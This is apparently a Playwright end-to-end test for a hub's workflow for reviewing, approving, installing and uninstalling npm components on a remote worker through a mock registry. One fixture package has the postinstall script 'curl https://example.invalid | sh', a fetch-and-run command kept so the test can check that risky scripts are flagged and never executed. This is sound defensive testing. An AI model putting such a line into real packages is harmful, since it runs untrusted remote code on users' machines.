import { spawn, spawnSync, type ChildProcess } from 'node:child_process';
import { existsSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test, expect } from '@playwright/test';
import { loginByApi } from './login.ts';
import { startMockRegistry } from '../packages/node-gateway/src/testing/mock-npm-registry.ts';

const SHOTS = process.env['E2E_SCREENSHOTS'];

async function writeHeaders(page: import('@playwright/test').Page, baseURL: string): Promise<Record<string, string>> {
  const csrf = (await page.context().cookies()).find((cookie) => cookie.name === 'hub_csrf')?.value ?? '';
  return { origin: baseURL, 'x-hub-csrf': csrf };
}

/**
 * 运行时套件 P2（ADR 0021 §7/§8）：cluster_admin 在手机宽度上提交、看安装脚本、批准；
 * 再在机器页上装到一台远程 Worker，安装脚本不执行，清单变 ✓；最后卸载。全部走本地假 registry。
 */
test('组件：提交 → 看脚本 → 批准 → 装到机器 → 卸载（390px）', async ({ page, baseURL }) => {
  test.setTimeout(150_000);
  const run = Date.now().toString(36);
  const id = `e2e-ext-${run}`;
  const pkg = `e2e-pi-ext-${run}`;
  const registry = await startMockRegistry(
    [
      { name: pkg, version: '1.0.0', scripts: { postinstall: 'node -e "require(\'fs\').writeFileSync(\'postinstall.ok\', \'1\')"' } },
      { name: pkg, version: '1.1.0', scripts: { postinstall: 'curl https://example.invalid | sh' } },
      { name: `${pkg}-b`, version: '2.0.0' }
    ],
    17981
  );
  await loginByApi(page);
  const headers = await writeHeaders(page, baseURL!);
  const state = mkdtempSync(join(tmpdir(), 'hub-e2e-comp-'));
  const runtimesDir = join(state, 'runtimes');
  let worker: ChildProcess | null = null;
  let workerId = '';
  try {
    await page.setViewportSize({ width: 390, height: 844 });
    await page.goto('/#/admin/components');
    await page.getByTestId('component-id').fill(id);
    await page.getByTestId('component-package').fill(pkg);
    await page.getByTestId('component-version').fill('1.0.0');
    await page.getByTestId('component-caps').fill(`tool:${id}`);
    await page.getByTestId('component-submit').click();
    const item = page.getByTestId('component-item').filter({ hasText: id }).filter({ hasText: '1.0.0' });
    await expect(item.getByTestId('component-status')).toContainText(/待审/, { timeout: 20_000 });
    await expect(item.getByTestId('component-scripts')).toContainText('postinstall');
    await expect(item.getByTestId('component-scripts-warning')).toContainText('不会执行');
    await expect(item.getByTestId('component-has-scripts')).toBeVisible();
    await item.getByTestId('component-approve').click();
    await expect(item.getByTestId('component-status')).toContainText(/已批准|通过/);

    // 第二个版本走 API 提交：脚本跟上一个批准版不一样，要标出来，危险命令高亮
    expect((await page.request.post('/api/components', { data: { id, runtime: 'pi', packageName: pkg, version: '1.1.0', provides: [{ capability: `tool:${id}` }] }, headers })).ok()).toBe(true);
    await page.reload();
    const next = page.getByTestId('component-item').filter({ hasText: id }).filter({ hasText: '1.1.0' });
    await expect(next.getByTestId('script-changed')).toBeVisible();
    await expect(next.getByTestId('script-risky').first()).toBeVisible();
    for (const el of [page.getByTestId('component-list')]) {
      const box = await el.boundingBox();
      expect(box && box.x + box.width).toBeLessThanOrEqual(390);
    }
    expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(390);
    if (SHOTS) await page.screenshot({ path: join(SHOTS, 'components-admin-390.png'), fullPage: true });

    // 接一台远程机器，npm 指向假 registry
    const pairing = await page.request.post('/api/workers/pairing', { data: {}, headers });
    const code = ((await pairing.json()) as { code: string }).code;
    const hubUrl = `${baseURL!.replace(/^http/, 'ws')}/worker`;
    const PATH = `${process.env['HOME']}/.local/bin:/usr/local/bin:/usr/bin:/bin`;
    const enrolled = spawnSync(process.execPath, ['apps/worker/src/enroll.ts'], { env: { PATH, HUB_URL: hubUrl, HUB_PAIR: code, WORKER_LABEL: `e2e 组件机器 ${run}` }, encoding: 'utf8' });
    expect(enrolled.status).toBe(0);
    const [wid = '', credential = ''] = enrolled.stdout.trim().split('\n');
    workerId = wid;
    worker = spawn(process.execPath, ['apps/worker/src/main.ts'], {
      env: {
        PATH, HOME: process.env['HOME'] ?? state, HUB_URL: hubUrl, HUB_WORKER_CREDENTIAL: credential, WORKER_ID: workerId, WORKER_ORIGIN: 'remote',
        WORKER_LABEL: `e2e 组件机器 ${run}`, WORKER_ROOTS: '/tmp', WORKER_STATE_DIR: state, WORKER_RUNTIMES_DIR: runtimesDir,
        npm_config_registry: `${registry.url}/`, npm_config_cache: join(state, 'npm-cache')
      },
      stdio: 'ignore'
    });
    type W = { workerId: string; inventory?: { componentInstall?: boolean; components: { id: string; version: string; managedBy: string }[] }; drift?: { items: { componentId: string }[] }; runtimeJob?: { state: string; message?: string } };
    const me = async () => ((await (await page.request.get('/api/workers')).json()) as W[]).find((w) => w.workerId === workerId);
    await expect.poll(async () => (await me())?.inventory?.componentInstall === true, { timeout: 30_000 }).toBe(true);

    await page.goto('/');
    await page.getByRole('button', { name: /^Worker：/ }).first().click();
    await page.getByRole('button', { name: new RegExp(`e2e 组件机器 ${run}`) }).click();
    const actions = page.getByTestId('component-actions');
    await expect(actions).toBeVisible({ timeout: 20_000 });
    await actions.getByTestId('component-pick').selectOption(`${id}@1.0.0`);
    await actions.getByTestId('component-install').click();
    await expect.poll(async () => (await me())?.runtimeJob?.state, { timeout: 60_000 }).toBe('succeeded');
    await expect.poll(async () => (await me())?.inventory?.components.find((c) => c.id === id)?.version, { timeout: 30_000 }).toBe('1.0.0');
    expect((await me())?.drift?.items.filter((i) => i.componentId === id)).toEqual([]);
    const installed = join(runtimesDir, 'components', 'pi', id, 'current');
    expect(existsSync(installed)).toBe(true);
    // ADR 0021 决定 8（2026-10-31 修订）：安装脚本一律不执行
    expect(existsSync(join(installed, 'node_modules', pkg, 'package.json'))).toBe(true);
    expect(existsSync(join(installed, 'node_modules', pkg, 'postinstall.ok'))).toBe(false);
    const row = page.getByTestId('inventory-component').filter({ hasText: id });
    await expect(row).toContainText('✓', { timeout: 20_000 });
    await row.scrollIntoViewIfNeeded();
    expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(390);
    if (SHOTS) await page.screenshot({ path: join(SHOTS, 'components-worker-390.png') });

    page.once('dialog', (d) => void d.accept());
    await actions.getByTestId(`component-uninstall-${id}`).click();
    await expect.poll(async () => (await me())?.inventory?.components.some((c) => c.id === id), { timeout: 60_000 }).toBe(false);

    // 整套安装（P3）：勾两个已批准的组件，一个任务装上（全有或全无）
    const id2 = `${id}-b`;
    expect((await page.request.post('/api/components', { data: { id: id2, packageName: `${pkg}-b`, version: '2.0.0', provides: [] }, headers })).ok()).toBe(true);
    expect((await page.request.post(`/api/components/${id2}/2.0.0/review`, { data: { approve: true }, headers })).ok()).toBe(true);
    await page.reload();
    await page.getByRole('button', { name: /^Worker：/ }).first().click();
    await page.getByRole('button', { name: new RegExp(`e2e 组件机器 ${run}`) }).click();
    await page.getByTestId('bundle-install-open').click();
    const dialog = page.getByTestId('bundle-install-dialog');
    await expect(dialog.getByTestId('bundle-all-or-nothing')).toContainText('全有或全无');
    await dialog.getByTestId(`bundle-pick-${id}`).check();
    await dialog.getByTestId(`bundle-pick-${id2}`).check();
    await dialog.getByTestId('bundle-install-confirm').click();
    await expect.poll(async () => (await me())?.runtimeJob?.state, { timeout: 60_000 }).toBe('succeeded');
    await expect
      .poll(async () => ((await me())?.inventory?.components ?? []).filter((c) => c.id === id || c.id === id2).map((c) => c.id).sort(), { timeout: 30_000 })
      .toEqual([id, id2].sort());
    expect(registry.hits.some((h) => h.endsWith('.tgz'))).toBe(true);
  } finally {
    worker?.kill();
    if (workerId) await page.request.delete(`/api/workers/${encodeURIComponent(workerId)}`, { headers }).catch(() => undefined);
    await registry.close();
    rmSync(state, { recursive: true, force: true });
  }
});
